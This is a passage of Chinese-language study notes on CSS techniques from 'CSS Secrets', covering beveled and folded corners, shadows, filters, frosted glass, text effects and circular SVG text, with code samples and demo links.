<span><span>@mixin</span> <span>beveled-corners</span><span>(</span>$bg<span>,</span> $<span>tl</span><span>:</span> 0<span>,</span> $<span>tr</span><span>:</span> $tl<span>,</span> $<span>br</span><span>:</span> $tl<span>,</span> $<span>bl</span><span>:</span> $tr<span>)</span></span> <span>{</span>
  <span>background</span><span>:</span> $bg<span>;</span> <span>/* 回退样式 */</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>135deg<span>,</span> transparent $tl<span>,</span> $bg 0<span>)</span> top left<span>,</span> <span>linear-gradient</span><span>(</span>
        225deg<span>,</span>
        transparent $tr<span>,</span>
        $bg 0
      <span>)</span> top right<span>,</span> <span>linear-gradient</span><span>(</span>-45deg<span>,</span> transparent $br<span>,</span> $bg 0<span>)</span> bottom right<span>,</span>
    <span>linear-gradient</span><span>(</span>45deg<span>,</span> transparent $bl<span>,</span> $bg 0<span>)</span> bottom left<span>;</span>
  <span>background-size</span><span>:</span> 50% 50%<span>;</span>
  <span>background-repeat</span><span>:</span> no-repeat<span>;</span>
<span>}</span>
<span>/* 使用：传入 2~5 个参数 */</span>
<span><span>@include</span> <span>beveled-corners</span><span>(</span>#58a<span>,</span> 15px<span>,</span> 5px<span>)</span><span>;</span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><ul>
<li>弧形切角（<a href="http://play.csssecrets.io/scoop-corners" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
<span>background</span><span>:</span> <span>radial-gradient</span><span>(</span>circle at top left<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> top left<span>,</span>
  <span>radial-gradient</span><span>(</span>circle at top right<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> top right<span>,</span>
  <span>radial-gradient</span><span>(</span>circle at bottom right<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> bottom right<span>,</span>
  <span>radial-gradient</span><span>(</span>circle at bottom left<span>,</span> transparent 15px<span>,</span> #58a 0<span>)</span> bottom left<span>;</span>
<span>background-size</span><span>:</span> 50% 50%<span>;</span>
<span>background-repeat</span><span>:</span> no-repeat<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><ul>
<li>内联 SVG 与 border-image 方案（<a href="http://play.csssecrets.io/bevel-corners" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>border</span><span>:</span> 20px solid #58a<span>;</span>
<span>border-image</span><span>:</span> 1
  <span><span>url</span><span>(</span><span>'data:image/svg+xml,&lt;svg xmlns="http://www.w3.org/2000/svg" width="3" height="3" fill="%2358a">&lt;polygon points="0,1 1,0 2,0 3,1 3,2 2,3 1,3 0,2"/>&lt;/svg>'</span><span>)</span></span><span>;</span>
<span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
<span>background-clip</span><span>:</span> padding-box<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>裁切路径方案 - 不完全支持（<a href="http://play.csssecrets.io/bevel-corners" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span>
<span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>
  20px 0<span>,</span>
  <span>calc</span><span>(</span>100% - 20px<span>)</span> 0<span>,</span>
  100% 20px<span>,</span>
  100% <span>calc</span><span>(</span>100% - 20px<span>)</span><span>,</span>
  <span>calc</span><span>(</span>100% - 20px<span>)</span> 100%<span>,</span>
  20px 100%<span>,</span>
  0 <span>calc</span><span>(</span>100% - 20px<span>)</span><span>,</span>
  0 20px
<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>CSS4 切角效果（<a href="http://play.csssecrets.io/bevel-corners-clipped" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>border-radius</span><span>:</span> 15px<span>;</span>
<span>corner-shape</span><span>:</span> bevel<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_15-梯形标签页"> 15. 梯形标签页</h2>
<ul>
<li>
<p>对元素使用了 3D 变形之后，其内部的变形效应是 “不可逆转“。在 2D 变形的体系之下，内部的逆向变形可以抵消外部的变形效应。</p>
</li>
<li>
<p>缺点：斜边的角度依赖于元素的宽度（<a href="http://play.csssecrets.io/trapezoid-tabs" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
<div><pre><code><span>nav > a</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>padding</span><span>:</span> 0.3em 1em 0<span>;</span>
<span>}</span>
<span>nav > a::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>background</span><span>:</span> #ccc<span>;</span>
  <span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>
    <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.6<span>)</span><span>,</span>
    <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0<span>)</span>
  <span>)</span><span>;</span>
  <span>border</span><span>:</span> 1px solid <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.4<span>)</span><span>;</span>
  <span>border-bottom</span><span>:</span> none<span>;</span>
  <span>border-radius</span><span>:</span> 0.5em 0.5em 0 0<span>;</span>
  <span>box-shadow</span><span>:</span> 0 0.15em white inset<span>;</span>
  <span>transform</span><span>:</span> <span>perspective</span><span>(</span>0.5em<span>)</span> <span>rotateX</span><span>(</span>5deg<span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> bottom<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_16-简单的饼图"> 16. 简单的饼图</h2>
<ul>
<li>还是用 canvas 吧！ ┭┮﹏┭┮。</li>
</ul>
<h2 id="_17-单侧投影"> 17. 单侧投影</h2>
<ul>
<li>
<p>使用 4px 的模糊半径意味着投影的尺寸会比元素本身的尺寸大约 8px。</p>
</li>
<li>
<p>一个 -5px 的扩张半径会把投影的宽度和高度各减少 10px （即每边各 5px ）。</p>
</li>
<li>
<p>单侧投影（<a href="http://play.csssecrets.io/shadow-one-side" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
<div><pre><code><span>box-shadow</span><span>:</span> 0 5px 4px -4px black<span>;</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>邻边投影（<a href="http://play.csssecrets.io/shadow-2-sides" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>box-shadow</span><span>:</span> 3px 3px 6px -3px black<span>;</span>
</code></pre>
<div><span>1</span><br></div></div><ul>
<li>双侧投影（<a href="http://play.csssecrets.io/shadow-opposite-sides" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>box-shadow</span><span>:</span> 5px 0 5px -5px black<span>,</span> -5px 0 5px -5px black<span>;</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_18-不规则投影"> 18. 不规则投影</h2>
<ul>
<li>CSS 滤镜 - 不完全支持（<a href="http://play.csssecrets.io/drop-shadow" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>filter</span><span>:</span> <span>drop-shadow</span><span>(</span>2px 2px 10px <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.5<span>)</span><span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_19-染色效果"> 19. 染色效果</h2>
<ul>
<li>基于滤镜的方案 - 不完全支持（<a href="http://play.csssecrets.io/color-tint-filter" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>/* 降饱和度的橙黄色染色效果 */</span>
<span>filter</span><span>:</span> <span>sepia</span><span>(</span>1<span>)</span> <span>saturate</span><span>(</span>4<span>)</span> <span>hue-rotate</span><span>(</span>295deg<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>基于混合模式的方案 - 不完全支持（<a href="http://play.csssecrets.io/color-tint" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#something<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>tiger.jpg<span>"</span></span> <span>alt</span><span><span>=</span><span>"</span>Rawrrr!<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>/* 保留上层元素的 HSL 亮度信息，并从它的下层吸取色相和饱和度信息 */</span>
<span>a</span> <span>{</span>
  <span>background</span><span>:</span> <span>hsl</span><span>(</span>335<span>,</span> 100%<span>,</span> 50%<span>)</span><span>;</span>
<span>}</span>
<span>img</span> <span>{</span>
  <span>mix-blend-mode</span><span>:</span> luminosity<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_20-毛玻璃效果-demo"> 20. 毛玻璃效果（<a href="http://play.csssecrets.io/frosted-glass" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>backdrop-filter 是让当前元素所在区域后面的内容模糊灰度或高亮之类，要想看到效果，需要元素本身半透明或者完全透明。而 filter 是让当前元素自身模糊灰度或高亮之类（<a href="https://www.zhangxinxu.com/wordpress/2019/11/css-backdrop-filter" target="_blank" rel="noopener noreferrer">鑫神</a>）。</li>
</ul>
<div><pre><code><span>/* 2021无效 */</span>
<span>body,
main::before</span> <span>{</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span><span>'tiger.jpg'</span><span>)</span></span> 0 / cover fixed<span>;</span>
<span>}</span>
<span>main</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>background</span><span>:</span> <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.3<span>)</span><span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
<span>main::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>filter</span><span>:</span> <span>blur</span><span>(</span>20px<span>)</span><span>;</span>
  <span>margin</span><span>:</span> -30px<span>;</span>
<span>}</span>

<span>/* 自身元素使用 backdrop-filter */</span>
<span>backdrop-filter</span><span>:</span> <span>blur</span><span>(</span>20px<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_21-折角效果"> 21. 折角效果</h2>
<ul>
<li>45° 折角的解决方案（<a href="http://play.csssecrets.io/folded-corner" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
<span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
      to left bottom<span>,</span>
      transparent 50%<span>,</span>
      <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.4<span>)</span> 0
    <span>)</span> no-repeat 100% 0 / 2em 2em<span>,</span> <span>linear-gradient</span><span>(</span>
    -135deg<span>,</span>
    transparent 1.5em<span>,</span>
    #58a 0
  <span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>其他角度的解决方案（<a href="http://play.csssecrets.io/folded-corner-realistic" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>.note</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>background</span><span>:</span> #58a<span>;</span> <span>/* 回退样式 */</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>-150deg<span>,</span> transparent 1.5em<span>,</span> #58a 0<span>)</span><span>;</span>
  <span>border-radius</span><span>:</span> 0.5em<span>;</span>
<span>}</span>
<span>.note::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
      to left bottom<span>,</span>
      transparent 50%<span>,</span>
      <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.2<span>)</span> 0<span>,</span>
      <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.4<span>)</span>
    <span>)</span> 100% 0 no-repeat<span>;</span>
  <span>width</span><span>:</span> 1.73em<span>;</span>
  <span>height</span><span>:</span> 3em<span>;</span>
  <span>transform</span><span>:</span> <span>translateY</span><span>(</span>-1.3em<span>)</span> <span>rotate</span><span>(</span>-30deg<span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> bottom right<span>;</span>
  <span>border-bottom-left-radius</span><span>:</span> inherit<span>;</span>
  <span>box-shadow</span><span>:</span> -0.2em 0.2em 0.3em -0.1em <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.15<span>)</span><span>;</span>
<span>}</span>

<span>/* SCSS */</span>
<span><span>@mixin</span> <span>folded-corner</span><span>(</span>$background<span>,</span> $size<span>,</span> $<span>angle</span><span>:</span> 30deg<span>)</span></span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>background</span><span>:</span> $background<span>;</span> <span>/* 回退样式 */</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
    $angle - 180deg<span>,</span>
    transparent $size<span>,</span>
    $background 0
  <span>)</span><span>;</span>
  <span>border-radius</span><span>:</span> 0.5em<span>;</span>
  $<span>x</span><span>:</span> $size / <span>sin</span><span>(</span>$angle<span>)</span><span>;</span>
  $<span>y</span><span>:</span> $size / <span>cos</span><span>(</span>$angle<span>)</span><span>;</span>
  <span>&amp;::before</span> <span>{</span>
    <span>content</span><span>:</span> <span>''</span><span>;</span>
    <span>position</span><span>:</span> absolute<span>;</span>
    <span>top</span><span>:</span> 0<span>;</span>
    <span>right</span><span>:</span> 0<span>;</span>
    <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
        to left bottom<span>,</span>
        transparent 50%<span>,</span>
        <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.2<span>)</span> 0<span>,</span>
        <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.4<span>)</span>
      <span>)</span> 100% 0 no-repeat<span>;</span>
    <span>width</span><span>:</span> $y<span>;</span>
    <span>height</span><span>:</span> $x<span>;</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>$y - $x<span>)</span> <span>rotate</span><span>(</span>2 * $angle - 90deg<span>)</span><span>;</span>
    <span>transform-origin</span><span>:</span> bottom right<span>;</span>
    <span>border-bottom-left-radius</span><span>:</span> inherit<span>;</span>
    <span>box-shadow</span><span>:</span> -0.2em 0.2em 0.3em -0.1em <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.2<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>/* 使用 */</span>
<span>.note</span> <span>{</span>
  <span><span>@include</span> <span>folded-corner</span><span>(</span>#58a<span>,</span> 2em<span>,</span> 40deg<span>)</span><span>;</span></span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br></div></div><h2 id="_22-连字符断行"> 22. 连字符断行</h2>
<ul>
<li>CSS3 hyphens（<a href="http://play.csssecrets.io/hyphenation" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>/* text-align: justify;  */</span> <span>/* 搭配两端对齐 */</span>
<span>hyphens</span><span>:</span> auto<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_23-插入换行-demo"> 23. 插入换行（<a href="http://play.csssecrets.io/line-breaks" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span><span>&lt;</span>dl</span><span>></span></span>
  <span><span><span>&lt;</span>dt</span><span>></span></span>Name:<span><span><span>&lt;/</span>dt</span><span>></span></span>
  <span><span><span>&lt;</span>dd</span><span>></span></span>Lea Verou<span><span><span>&lt;/</span>dd</span><span>></span></span>
  <span><span><span>&lt;</span>dt</span><span>></span></span>Email:<span><span><span>&lt;/</span>dt</span><span>></span></span>
  <span><span><span>&lt;</span>dd</span><span>></span></span>lea@verou.me<span><span><span>&lt;/</span>dd</span><span>></span></span>
  <span><span><span>&lt;</span>dd</span><span>></span></span>leaverou@mit.edu<span><span><span>&lt;/</span>dd</span><span>></span></span>
  <span><span><span>&lt;</span>dt</span><span>></span></span>Location:<span><span><span>&lt;/</span>dt</span><span>></span></span>
  <span><span><span>&lt;</span>dd</span><span>></span></span>Earth<span><span><span>&lt;/</span>dd</span><span>></span></span>
<span><span><span>&lt;/</span>dl</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><div><pre><code><span>dt,
dd</span> <span>{</span>
  <span>display</span><span>:</span> inline<span>;</span>
<span>}</span>
<span>dd</span> <span>{</span>
  <span>margin</span><span>:</span> 0<span>;</span>
  <span>font-weight</span><span>:</span> bold<span>;</span>
<span>}</span>
<span>dd + dt::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>'\A'</span><span>;</span>
  <span>white-space</span><span>:</span> pre<span>;</span>
<span>}</span>
<span>dd + dd::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>', '</span><span>;</span>
  <span>margin-left</span><span>:</span> -0.25em<span>;</span>
  <span>font-weight</span><span>:</span> normal<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_24-文本行的斑马条纹-demo"> 24. 文本行的斑马条纹（<a href="http://play.csssecrets.io/zebra-lines" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>padding</span><span>:</span> 0.5em<span>;</span>
<span>line-height</span><span>:</span> 1.5<span>;</span>
<span>background</span><span>:</span> beige<span>;</span>
<span>background-size</span><span>:</span> auto 3em<span>;</span>
<span>background-origin</span><span>:</span> content-box<span>;</span>
<span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span><span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.2<span>)</span> 50%<span>,</span> transparent 0<span>)</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_25-调整-tab-的宽度"> 25. 调整 tab 的宽度</h2>
<ul>
<li>浏览器会把 Tab 其宽度显示为 8 个字符 - 2021 可以显示原样（<a href="http://play.csssecrets.io/tab-size" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>pre</span> <span>{</span>
  <span>tab-size</span><span>:</span> 2<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_26-连字-demo"> 26. 连字（<a href="http://play.csssecrets.io/ligatures" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>font-variant-ligatures</span><span>:</span> common-ligatures
                        discretionary-ligatures
                        historical-ligatures<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_27-华丽的-符号-demo"> 27. 华丽的 &amp; 符号（<a href="http://play.csssecrets.io/ampersands" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> Ampersand<span>;</span>
  <span>src</span><span>:</span> <span>local</span><span>(</span><span>'Baskerville-Italic'</span><span>)</span><span>,</span>
       <span>local</span><span>(</span><span>'GoudyOldStyleT-Italic'</span><span>)</span><span>,</span>
       <span>local</span><span>(</span><span>'Palatino-Italic'</span><span>)</span><span>,</span>
       <span>local</span><span>(</span><span>'BookAntiqua-Italic'</span><span>)</span><span>;</span>
  <span>unicode-range</span><span>:</span> U+26<span>;</span>
<span>}</span>
<span>h1</span> <span>{</span>
  <span>font-family</span><span>:</span> Ampersand<span>,</span> Helvetica<span>,</span> sans-serif<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_28-现实中的文字效果"> 28. 现实中的文字效果</h2>
<ul>
<li>凸版印刷效果（<a href="http://play.csssecrets.io/letterpress" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> <span>hsl</span><span>(</span>210<span>,</span> 13%<span>,</span> 40%<span>)</span><span>;</span>
<span>color</span><span>:</span> <span>hsl</span><span>(</span>210<span>,</span> 13%<span>,</span> 75%<span>)</span><span>;</span>
<span>text-shadow</span><span>:</span> 0 -1px 1px black<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>空心字效果（<a href="http://play.csssecrets.io/stroked-text" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> deeppink<span>;</span>
<span>color</span><span>:</span> white<span>;</span>
<span>text-shadow</span><span>:</span> 0 0 1px black<span>,</span>
             0 0 1px black<span>,</span>
             0 0 1px black<span>,</span>
             0 0 1px black<span>,</span>
             0 0 1px black<span>,</span>
             0 0 1px black<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><ul>
<li>文字外发光效果（<a href="http://play.csssecrets.io/glow" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>/* text-shadow */</span>
<span>a</span> <span>{</span>
  <span>background</span><span>:</span> #203<span>;</span>
  <span>color</span><span>:</span> white<span>;</span>
  <span>transition</span><span>:</span> 1s<span>;</span>
<span>}</span>
<span>a:hover</span> <span>{</span>
  <span>color</span><span>:</span> transparent<span>;</span>
  <span>text-shadow</span><span>:</span> 0 0 0.1em white<span>,</span> 0 0 0.3em white<span>;</span>
<span>}</span>

<span>/* filter */</span>
<span>a</span> <span>{</span>
  <span>background</span><span>:</span> #203<span>;</span>
  <span>color</span><span>:</span> white<span>;</span>
  <span>transition</span><span>:</span> 1s<span>;</span>
<span>}</span>
<span>a:hover</span> <span>{</span>
  <span>filter</span><span>:</span> <span>blur</span><span>(</span>0.1em<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><ul>
<li>文字凸起效果（<a href="http://play.csssecrets.io/extruded" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>background</span><span>:</span> #58a<span>;</span>
<span>color</span><span>:</span> white<span>;</span>
<span>text-shadow</span><span>:</span> 0 1px <span>hsl</span><span>(</span>0<span>,</span>0%<span>,</span>85%<span>)</span><span>,</span>
             0 2px <span>hsl</span><span>(</span>0<span>,</span>0%<span>,</span>80%<span>)</span><span>,</span>
             0 3px <span>hsl</span><span>(</span>0<span>,</span>0%<span>,</span>75%<span>)</span><span>,</span>
             0 4px <span>hsl</span><span>(</span>0<span>,</span>0%<span>,</span>70%<span>)</span><span>,</span>
             0 5px <span>hsl</span><span>(</span>0<span>,</span>0%<span>,</span>65%<span>)</span><span>,</span>
             0 5px 10px black<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_29-环形文字-demo"> 29. 环形文字（<a href="http://play.csssecrets.io/circular-text" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>circular<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>svg</span> <span>viewBox</span><span><span>=</span><span>"</span>0 0 100 100<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>path</span> <span>d</span><span><span>=</span><span>"</span>M 0,50 a 50,50 0 1,1 0,1 z<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>circle<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>text</span><span>></span></span>
      <span><span><span>&lt;</span>textPath</span> <span><span>xlink:</span>href</span><span><span>=</span><span>"</span>#circle<span>"</span></span><span>></span></span>
        circular reasoning works because
      <span><span><span>&lt;/</span>textPath</span><span>></span></span>
    <span><span><span>&lt;/</span>text</span><span>></span></span>
  <span><span><span>&lt;/</span>svg</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>.circular path</span> <span>{</span>
  <span>fill</span><span>:</span> none<span>;</span>
<span>}</span>
<span>.circular</span> <span>{</span>
  <span>width</span><span>:</span> 15em<span>;</span>
  <span>height</span><span>:</span> 15em<span>;</span>
  <span>margin</span><span>:</span> 3em auto 0<span>;</span>
<span>}</span>
<span>.circular svg</span> <span>{</span>
  <span>display</span><span>:</span> block<span>;</span>
  <span>overflow</span><span>:</span> visible<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_30-扩大可点击区域"> 30. 扩大可点击区域</h2>
<div><pre><code><span>/* 方案一 */</span>
<span>border</span><span>:</span> 10px solid transparent<span>;</span>
<span>background-clip</span><span>:</span> padding-box<span>;</span>

<span>/* 方案二 */</span>
<span>border</span><span>:</span> 10px solid transparent<span>;</span>
